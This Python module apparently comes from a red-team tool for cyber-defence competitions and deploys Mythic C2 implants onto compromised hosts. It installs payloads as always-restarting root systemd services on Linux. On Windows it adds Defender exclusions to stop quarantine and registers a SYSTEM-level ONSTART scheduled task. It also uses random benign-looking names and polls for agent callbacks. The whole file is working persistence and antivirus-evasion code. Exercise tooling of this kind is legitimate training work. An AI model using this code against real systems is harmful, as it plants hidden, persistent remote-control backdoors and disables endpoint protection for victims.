"""Planting the C2 channel on a box, and reading back the evidence.

The engine builds and FREEZES the payload matrix at comp-prep
(`competitions/<id>/red/payloads/` + a `uuid -> box` manifest), because builds
never run mid-event: a lost Mythic state is re-prep, and the payloads are the
artifacts that matter. This module consumes the manifest:

    manifest = {
      "comp": "<id>", "operation": "<mythic operation>",
      "transports": ["http", "webhook"],
      "boxes": {"web01-1": {"uuid": "...", "file": "web01-1.bin",
                            "os": "linux", "agent": "poseidon",
                            "transport": "http"}}}

`Planter.plant()` copies the frozen payload to the box, registers it (systemd
unit on Linux, service + at-logon task on Windows — whichever the payload
supports), verifies the install ON THE BOX, and then asks the operation whether a
callback appeared. The RECORD is written from the install and always; the
callback is evidence about it. That ordering is deliberate — the earlier agent
gated the artifact write on the channel proof and a slow check-in turned a live
plant into a silent absence in both blue's and the organizer's lists.
"""

import json
import os
import tempfile
import time
from pathlib import Path

from ..errors import C2Error
from . import FakeMythic  # noqa: F401  (re-exported convenience for callers)

MANIFEST_REL = Path("red/payloads/manifest.json")


def manifest_path(comp_dir):
    return Path(comp_dir) / MANIFEST_REL


def load_manifest(comp_dir):
    """The frozen payload manifest, or {} when comp-prep has not run."""
    path = manifest_path(comp_dir)
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except ValueError as exc:
        raise C2Error(f"{path} is not valid JSON: {exc}") from exc


def manifest_entry(manifest, box_id, transport=None):
    """The box's frozen payload.

    comp-prep keys the manifest `<box>:<transport>` (a box may carry one payload per
    transport); the caller knows only the box, so fall back to its first entry.
    """
    boxes = (manifest or {}).get("boxes") or {}
    if box_id in boxes:
        return boxes[box_id]
    wanted = f"{box_id}:{transport}" if transport else None
    if wanted and wanted in boxes:
        return boxes[wanted]
    for key, entry in boxes.items():
        if key.split(":", 1)[0] == box_id:
            return entry
    return None


def payload_file(comp_dir, entry):
    if not entry:
        return None
    path = Path(comp_dir) / "red/payloads" / (entry.get("file") or "")
    return path if path.exists() else None


def _schtasks_status(output):
    """The `Status:` value of a `schtasks /Query /FO LIST` body ("" when absent)."""
    for line in (output or "").splitlines():
        if line.strip().lower().startswith("status:"):
            return line.split(":", 1)[1].strip()
    return ""


class Planter:
    """Installs frozen payloads. Uses only ctx.ssh + ctx.c2 (+ ctx.world to note)."""

    def __init__(self, ctx, comp_dir=None, manifest=None, now=None):
        self.ctx = ctx
        self.comp_dir = comp_dir or (ctx.cfg["run"].get("comp_dir") or ".")
        self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
        self._now = now or time.time

    # -- install ------------------------------------------------------------

    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
        """Install the frozen payload for `box_id` and report both facts.

        The callback window is config (`c2.callback_wait_sec`, 120s): a freshly
        installed Mythic takes MINUTES for the first agent check-in, and the old
        45s default reported "no callback" on every box of the 2026-10-18 scrim
        while all six channels were live two minutes later.
        """
        if wait_sec is None:
            wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
        os_name = os_name or self.ctx.os_of(ip)
        entry = manifest_entry(self.manifest, box_id, transport)
        if entry is None:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"no manifest entry for {box_id} "
                              "(run comp-prep / `tlaloc c2-prep` first)"}
        local = payload_file(self.comp_dir, entry)
        if local is None:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"payload file for {box_id} is missing from "
                              f"{self.comp_dir}/red/payloads"}
        transport = transport or entry.get("transport") or "http"
        if os_name == "windows":
            installed = self._install_windows(ip, box_id, local, transport,
                                              wait_sec=wait_sec)
        else:
            installed = self._install_linux(ip, box_id, local, transport)

        callback_seen = self.wait_for_callback(box_id, wait_sec=wait_sec) \
            if installed.get("ok") else False
        return {**installed, "box": box_id, "os": os_name, "transport": transport,
                "callback_seen": callback_seen, "uuid": entry.get("uuid"),
                "payload": str(local)}

    def _install_linux(self, ip, box_id, local, transport):
        from ..effects import artifactnames as names
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        names_drawn = names.linux_names(self.ctx.world, rng=self.ctx.rng,
                                       mode=names.mode_from_cfg(self.ctx.cfg))
        unit = names_drawn["unit"]
        stage = f"/tmp/{names_drawn['stem']}"
        remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}"
        rc, _out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                         f"mkdir -p {stage}", timeout=60,
                                         key_path=fh.get("key_path"))
        if rc != 0:
            return {"ok": False, "detail": f"payload staging dir on {ip} failed: "
                            f"{(err or _out).strip()[:200]}", "paths": [remote]}
        try:
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  f"{stage}/{box_id}", mode=0o755,
                                  key_path=fh.get("key_path"))
        except Exception as exc:                       # transport blowups are data
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}
        unit_text = (
            "[Unit]\n"
            f"Description={names_drawn['unit_desc']}\n"
            "After=network-online.target\n\n"
            "[Service]\n"
            f"ExecStart={remote}\n"
            "Restart=always\nRestartSec=15\n\n"
            "[Install]\nWantedBy=multi-user.target\n")
        # /usr/local/lib and /etc/systemd are root-owned. Install with whatever
        # root path this foothold actually holds. The box's own NOPASSWD sudo is
        # the common case, but a competition's misconfigurations can break it —
        # web01's writable-sudoers chmods /etc/sudoers.d, after which sudo refuses
        # ("/etc/sudoers.d is world writable", then "a password is required") on
        # every cycle. The escalated foothold still reaches root there, so ride
        # that path instead of failing the plant. The unit file travels with the
        # payload and is moved into place, so no root wrapper has to parse a
        # heredoc.
        from ..effects.base import root_cmd            # lazy: avoids a cycle
        lib_dir = f"/usr/local/lib/{names_drawn['stem']}"
        unit_path = f"/etc/systemd/system/{unit}"
        unit_stage = f"{stage}/{unit}"
        local_unit = None
        try:
            fd, local_unit = tempfile.mkstemp(prefix="tlaloc-unit-", suffix=".service")
            with os.fdopen(fd, "w", encoding="utf-8") as handle:
                handle.write(unit_text)
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local_unit,
                                  unit_stage, mode=0o644,
                                  key_path=fh.get("key_path"))
        except Exception as exc:                       # transport blowups are data
            return {"ok": False, "detail": f"unit staging to {ip} failed: {exc}",
                    "paths": [remote]}
        finally:
            if local_unit and os.path.exists(local_unit):
                os.unlink(local_unit)
        script = ("set -e\n"
                  + root_cmd(f"mkdir -p {lib_dir}", fh) + "\n"
                  + root_cmd(f"mv {stage}/{box_id} {remote}", fh) + "\n"
                  + root_cmd(f"chmod 755 {remote}", fh) + "\n"
                  + root_cmd(f"mv {unit_stage} {unit_path}", fh) + "\n"
                  + root_cmd("systemctl daemon-reload", fh) + "\n"
                  + root_cmd(f"systemctl enable --now {unit}", fh) + "\n"
                  + f"systemctl is-active {unit}\n")
        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                       script, timeout=120,
                                       key_path=fh.get("key_path"))
        active = (out or "").strip().splitlines()[-1:] == ["active"]
        ok = rc == 0 and active
        return {"ok": ok,
                "detail": (f"{unit} active on {ip} (transport {transport})" if ok
                           else f"unit install rc={rc}: {(err or out).strip()[:200]}"),
                "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
                "check_cmd": f"systemctl is-active {unit}"}

    def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
        """Install the frozen payload as an ONSTART scheduled task running as SYSTEM.

        A Mythic console agent (apollo) is NOT a service binary: `New-Service`
        registers it and `Start-Service` then dies with 1053 ("did not respond in
        a timely manner"). That is what every Windows box reported on the
        2026-10-18 scrim — `service install rc=1: #< CLIXML …`, 0/26. A scheduled
        task runs the console agent as SYSTEM at boot and can be started
        immediately, so the channel comes up without a service wrapper.
        """
        from ..effects import artifactnames as names
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        drawn = names.windows_names(self.ctx.world, rng=self.ctx.rng,
                                    mode=names.mode_from_cfg(self.ctx.cfg))
        task = drawn["task"]
        remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
        remote = f"{remote_dir}\\{box_id}.exe"
        staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
        exclusion = ""
        try:
            self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                             f'powershell -NoProfile -Command "New-Item -ItemType '
                             f'Directory -Force -Path \'{remote_dir}\' | Out-Null"',
                             timeout=90, key_path=fh.get("key_path"))
            # Defender quarantines a Mythic agent on sight: live dc01 removed the
            # payload AND the task within seconds of every plant (ThreatID
            # 2147958560, resources file+C:\Windows\System32\dc01-120.exe and
            # service:dc01-120) while the same payload ran fine on win02. Exclude
            # the staging directory and the binary's name first; the restore
            # recipe puts both back.
            exclusion = str(Path(staged).name)
            self.ctx.ssh.ssh(
                ip, fh["user"], fh.get("password") or "",
                f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '
                f'\'{remote_dir}\' -ErrorAction SilentlyContinue; Add-MpPreference '
                f'-ExclusionProcess \'{exclusion}\' -ErrorAction SilentlyContinue"',
                timeout=90, key_path=fh.get("key_path"))
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  staged, key_path=fh.get("key_path"))
        except Exception as exc:                       # transport blowups are data
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}
        # /F makes the create idempotent, and the query is the proof, not the rc (a
        # second /Run of an already-running task answers non-zero). Every step is
        # `&&`-chained: a bare `&` backgrounds the create and the query then reads
        # the task before it exists (that reported status=Ready on dc01 while the
        # task was still being registered).
        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC ONSTART /RU SYSTEM '
                  f'/RL HIGHEST /F && schtasks /Run /TN "{task}" && '
                  f'schtasks /Query /TN "{task}" /FO LIST')
        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                        script, timeout=180,
                                        key_path=fh.get("key_path"))
        status = _schtasks_status(out)
        deadline = self._now() + float(wait_sec)
        while status.lower() != "running" and self._now() < deadline:
            time.sleep(3)
            _r, _o, _e = self.ctx.ssh.ssh(
                ip, fh["user"], fh.get("password") or "",
                f'schtasks /Query /TN "{task}" /FO LIST', timeout=60,
                key_path=fh.get("key_path"))
            status = _schtasks_status(_o)
        ok = status.lower() == "running"
        if not ok:
            # The task can start and then be reported outside the query window (or
            # removed while its process lives). The process IS the implant: ask for
            # it by image name before declaring the plant dead.
            _r, _o, _e = self.ctx.ssh.ssh(
                ip, fh["user"], fh.get("password") or "",
                f'tasklist /FI "IMAGENAME eq {Path(staged).name}"', timeout=60,
                key_path=fh.get("key_path"))
            if Path(staged).name.lower() in (_o or "").lower():
                ok = True
                status = status or "process running"
        return {"ok": ok,
                "detail": (f"task {task} Running on {ip} (transport {transport})" if ok
                           else f"task install rc={rc} status={status or '?'}: "
                                f"{(err or out).strip()[:200]}"),
                "unit": task, "paths": [remote, f"task:{task}"],
                "defender": {"path": remote_dir, "process": exclusion},
                "check_cmd": f'schtasks /Query /TN "{task}" /FO LIST'}

    # -- evidence -----------------------------------------------------------

    def wait_for_callback(self, box_id, *, wait_sec=45, poll_interval=5):
        """Poll the operation for this box's callback inside `wait_sec`.

        A callback is a FRESH row (`c2.callback_max_age_sec`), never the mere
        existence of a row: tavern/mythic keep rows after the agent dies.
        """
        if self.ctx.c2 is None:
            return False
        deadline = self._now() + max(wait_sec, 0)
        while True:
            try:
                record = self.ctx.c2.callbacks().get(box_id)
            except C2Error:
                return False
            if record and self._fresh(record):
                if self.ctx.world is not None and record.get("seen_at"):
                    self.ctx.world.note_callback(box_id, self._iso(record["seen_at"]),
                                                 agent=record.get("agent"),
                                                 external_id=record.get("external_id"))
                return True
            if self._now() >= deadline:
                return False
            time.sleep(poll_interval)

    def _fresh(self, record):
        seen = record.get("seen_at")
        if not seen:
            return False
        if str(record.get("agent") or "").lower() == "none":
            return False
        max_age = float(self.ctx.cfg["c2"].get("callback_max_age_sec", 120))
        return (self._now() - float(seen)) <= max_age

    def _iso(self, epoch):
        return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))
